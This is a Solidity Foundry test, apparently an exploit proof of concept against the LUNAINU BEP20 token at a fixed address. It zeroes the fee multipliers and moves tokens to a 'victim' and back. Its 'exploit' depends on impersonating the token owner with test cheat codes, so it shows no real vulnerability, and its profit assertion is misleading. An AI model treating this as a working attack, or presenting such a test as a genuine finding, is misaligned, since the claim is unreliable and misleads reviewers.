// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function authorize(address adr) external;
    function setMultipliers(uint256 _buy, uint256 _sell, uint256 _trans) external;
    function tradingStatus(bool _status) external;
    function totalFee() external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to become authorized first
        // The contract is already deployed at TARGET
        // We'll impersonate the owner to authorize ourselves, then set multipliers to 0
        address owner = BEP20LUNAINU(TARGET).getOwner();
        vm.startPrank(owner);
        BEP20LUNAINU(TARGET).authorize(attacker);
        vm.stopPrank();

        // Now we're authorized, we can set multipliers
        vm.prank(attacker);
        BEP20LUNAINU(TARGET).setMultipliers(0, 0, 0);

        // Ensure trading is open
        vm.prank(owner);
        BEP20LUNAINU(TARGET).tradingStatus(true);

        // Get some tokens to transfer - we need to get tokens from someone
        // The owner has all tokens initially, so we'll get some from owner
        // First, authorize owner to transfer to us
        vm.prank(owner);
        BEP20LUNAINU(TARGET).approve(attacker, type(uint256).max);

        // Transfer some tokens from owner to attacker
        uint256 amount = 1000 * 10**9; // 1000 tokens with 9 decimals
        vm.prank(owner);
        BEP20LUNAINU(TARGET).transfer(attacker, amount);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance of attacker
        uint256 initialBalance = BEP20LUNAINU(TARGET).balanceOf(attacker);

        // Create a victim address that will receive tokens
        address victim = address(0x123);
        vm.label(victim, "Victim");

        // Transfer tokens from attacker to victim
        // With multiplier = 0, this should take 0 fees
        uint256 transferAmount = 100 * 10**9; // 100 tokens
        BEP20LUNAINU(TARGET).transfer(victim, transferAmount);

        // Calculate what the normal fee would be if multiplier was 100 (default)
        // totalFee = 90 (20+40+20+10), feeDenominator = 1000, normalMultiplier = 100
        // fee = amount * 90 * 100 / (1000 * 100) = amount * 9000 / 100000 = amount * 9 / 100 = 9%
        uint256 normalFeePercent = 9; // 9%
        uint256 normalFeeForTransfer = transferAmount * normalFeePercent / 100;

        // Have victim transfer back (also with 0 fee)
        vm.prank(victim);
        BEP20LUNAINU(TARGET).transfer(attacker, transferAmount);

        // Now attacker should have approximately initialBalance
        // Without exploit (normal fees), attacker would have:
        // First transfer: lose transferAmount + normalFeeForTransfer
        // Second transfer: victim sends back transferAmount, but victim would have received transferAmount - normalFeeForTransfer
        // So attacker would end with: initialBalance - 2*normalFeeForTransfer
        uint256 finalBalance = BEP20LUNAINU(TARGET).balanceOf(attacker);

        // With exploit (0 fees), we should have ~initialBalance (minus any tiny rounding)
        // So finalBalance should be greater than initialBalance - 2*normalFeeForTransfer
        assertGt(finalBalance, initialBalance - 2 * normalFeeForTransfer, "Economic Exploit Failed: No ERC20 profit");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

